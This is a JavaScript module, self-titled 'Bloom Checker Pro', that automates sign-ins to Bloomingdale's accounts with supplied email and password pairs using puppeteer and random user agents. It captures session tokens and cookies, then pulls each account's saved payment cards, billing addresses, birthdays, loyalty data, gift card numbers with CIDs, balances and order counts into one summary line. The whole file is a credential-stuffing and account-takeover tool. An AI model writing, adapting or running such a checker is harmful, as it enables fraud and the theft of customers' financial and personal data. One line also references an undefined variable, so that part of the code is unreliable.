const puppeteer = require('puppeteer');
const process = require('process');
const randomUserAgent = require('random-user-agent');
const requestSync = require('request-promise-native');
const cheerio = require('cheerio');
const unirest = require('unirest');

process.setMaxListeners(0)

var bloomLoginHelper = {

    parseDataBloomCheck: function (result) {

        let outputWallet = "No Wallet";
        let outputCardNumber = "No CardNumber"
        let outputOrder = "No Order";
        let outputBalance = "No Balance";
        let outputPoint = "No Point";
        let outputLoyalty = "No Loyalty";
        let outputRewards = "No Rewards";
        let outMSG = "Bloom Checker Pro";

        //wallet

        try {
            if (result[2].wallet.tenders[0]) {
                outputWallet = result[2].wallet.tenders.map(wallet => [
                    wallet.type,
                    wallet.cardNumber,
                    wallet.cardType,
                    `${wallet.expMonth}/${wallet.expYear}`,
                    `${wallet.billingAddress.firstName}  ${wallet.billingAddress.lastName}`,
                    `${wallet.billingAddress.line1}  ${wallet.billingAddress.city}  ${wallet.billingAddress.state}`,
                    wallet.billingAddress.countryCode,
                    wallet.billingAddress.zipCode,
                    wallet.billingAddress.bestPhone,
                    wallet.billingAddress.email,
                ].join(' | '));
                outputWallet = ` Total Wallet : ${result[2].wallet.tenders.length} / [${outputWallet.join('] - [')}]`
            }
        } catch (error) {

        }
        //wallet

        //loyalty
        try {
            if (result[1].loyalty.id) {
                outputLoyalty = [
                    result[1].loyalty.id.trim(),
                    `${result[1].loyalty.firstName} ${result[1].loyalty.lastName}`.trim(),
                    `${result[1].loyalty.dayOfBirth}/${result[1].loyalty.monthOfBirth}`.trim(),
                    result[1].loyalty.addressLine1,
                    result[1].loyalty.city.trim(),
                    result[1].loyalty.stateCd.trim(),
                    result[1].loyalty.postalCd.trim(),
                    result[1].loyalty.phone.trim(),
                    result[1].loyalty.email.trim(),
                ];
                outputLoyalty = ` Loyalty Detail : [${outputLoyalty.join(' | ')}]`;
            }
        } catch (error) {

        }

        //loyalty

        //blance
        try {
            if (result[0].loyallistRCBalance) {
                outputBalance = `Blance: ${result[0].loyallistRCBalance}`
            }
        } catch (error) {

        }

        //blance

        //point
        try {
            if (result[1].loyalty.points.totalAvailablePoints) {
                outputPoint = `Point: ${result[1].loyalty.points.totalAvailablePoints}`
            }
        } catch (error) {

        }

        //point

        //reward
        try {
            if (result[0].loyaltyRewardCardList[0]) {
                outputRewards = result[0].loyaltyRewardCardList.map(reward => reward.join(' | '));
                outputRewards = ` Total Rewards : ${result[0].loyaltyRewardCardList.length} / [${outputRewards.join('] - [')}]`
            }
        } catch (error) {

        }

        //reward

        //orders
        try {
            if (result[3].orderHistory.totalNumberOfOrders) {
                outputOrder = `Order: ${result[3].orderHistory.totalNumberOfOrders}`
            }
        } catch (error) {

        }
        //orders

        try {
            if (result[4].rewardcards.rewardcard[0]) {
                outputCardNumber = result[4].rewardcards.rewardcard.map(rewardcardData => [
                    rewardcardData.cardNumber,
                    rewardcardData.cid,
                    "$" + rewardcardData.amount,
                    rewardcardData.cardType,
                    rewardcardData.expireDate,
                    rewardcardData.status,
                ].join(' | '));

                outputCardNumber = ` Total (${result[4].rewardcards.rewardcard.length}) : / [${blance.join('] - [')}]`
            }
        } catch (error) {

        }


        let output = [
            outputBalance,
            outputCardNumber,
            outputPoint,
            outputLoyalty,
            outputWallet,
            outputRewards,
            outputOrder,
            outMSG,
        ]
        return output.join(' | ')
    },
    checkTotalInfo: async function (cookies) {
        let cookiesParseString = (cookies = []) => {
            let cookieStr = "";
            cookies.forEach(function (eachCookie) {
                cookieStr += `${eachCookie.name}=${eachCookie.value};`
            });
            return cookieStr;
        };

        let listPromies = []
        let header = {
            "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.67 Safari/537.36",
            "referer": "https://www.bloomingdales.com/loyallist/accountsummary",
            "cookie": cookiesParseString(cookies),
            "cache-control": "no-cache,no-cache",
            "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
            "accept-encoding": "gzip, deflate, br",
            "accept": "application/json, text/javascript, */*; q=0.01"
        };

        let reqRewardCard = unirest("GET", "https://www.bloomingdales.com/account/ocwalletservice/getRewardCards");
        reqRewardCard.headers(header);
        let dataRewardCard = new Promise((resolve, reject) => {
            reqRewardCard.end(function (res) {
                resolve(JSON.parse(res.body));
            });
        });
        listPromies.push(dataRewardCard);

        let reqLoyaltyd = unirest("GET", "https://m.bloomingdales.com/api/v1/loyalty");
        reqLoyaltyd.headers(header);
        let dataLoyalty = new Promise((resolve, reject) => {
            reqLoyaltyd.end(function (res) {
                resolve(res.body);
            });
        });
        listPromies.push(dataLoyalty);

        let reqWallet = unirest("GET", "https://m.bloomingdales.com/api/v1/wallet/summary");
        reqWallet.headers(header);
        let dataWallet = new Promise((resolve, reject) => {
            reqWallet.end(function (res) {
                resolve(res.body);
            });
        });
        listPromies.push(dataWallet);


        let reqOrder = unirest("GET", "https://m.bloomingdales.com/api/v1/order/orderhistory?year=2018");
        reqOrder.headers(header);
        let dataOrder = new Promise((resolve, reject) => {
            reqOrder.end(function (res) {
                resolve(res.body);
            });
        });

        listPromies.push(dataOrder);


        let reqCardNumber = unirest("GET", "https://m.bloomingdales.com/api/v1/wallet/rewardcards");
        reqCardNumber.headers(header);
        let dataCardNumber = await new Promise((resolve, reject) => {
            reqCardNumber.end(function (res) {
                resolve((res.body));
            });
        });
        listPromies.push(dataCardNumber);


        let result = await Promise.all(listPromies);
        return result;

    },
    bloomLogin: async (dataLogin, showBrowser = true) => {

        let blockAllowLoad = ['script', 'xhr', 'document'];

        let modePuppeteer = {
            headless: showBrowser,
            ignoreHTTPSErrors: true,
            args: ['--start-maximized', '--no-sandbox', '--hide-scrollbars', '--mute-audio', '--disable-setuid-sandbox', '--disable-sync', '--disable-background-networking', '--disable-infobars', '--disable-setuid-sandbox', '--ignore-certifcate-errors']
        };
        let loginSuccess = false;
        let detailLogin = {};

        let browser = await puppeteer.launch(modePuppeteer);
        let page = (await browser.pages())[0];

        let userAgent = randomUserAgent();

        if (showBrowser) {
            await page.setRequestInterception(true);
            page.on('request', (req) => {
                if (blockAllowLoad.includes(req.resourceType())) {
                    req.continue();
                } else {
                    req.abort();
                }
            });
        }


        page.on('response', (res) => {

            let dataRequest = res.request().method();
            if (res.url() == "https://auth.bloomingdales.com/v3/oauth2/token" && dataRequest == "POST") {

                res.json().then(result => {
                    detailLogin = result
                    if (result.access_token)
                        loginSuccess = true;
                }).catch(result => {

                })
            }

        });

        await page.setUserAgent(userAgent);

        await page.setViewport({
            width: 1368,
            height: 720
        });

        await page.goto("https://www.bloomingdales.com/account/signin").catch(() => {});

        if (await page.$("#email") == null) {
            await page.goto("https://www.bloomingdales.com/account/signin").catch(() => {});
        }

        if (await page.$("#pw-input") == null) {
            await page.goto("https://www.bloomingdales.com/account/signin").catch(() => {});
        }

        if (await page.$("#sign-in") == null) {
            await page.goto("https://www.bloomingdales.com/account/signin").catch(() => {});
        }
        if (await page.$("#email") !== null) {
            await page.evaluate((dataLogin) => {
                document.querySelector("#email").value = dataLogin.email
                document.querySelector("#pw-input").value = dataLogin.password
                document.querySelector("#sign-in").click()
            }, dataLogin);
        }

        await page.waitFor(10000);
        let cookie = await page.cookies();

        await browser.close();

        return {
            ...dataLogin,
            loginSuccess,
            detailLogin,
            cookie
        }
    }
}


module.exports = bloomLoginHelper;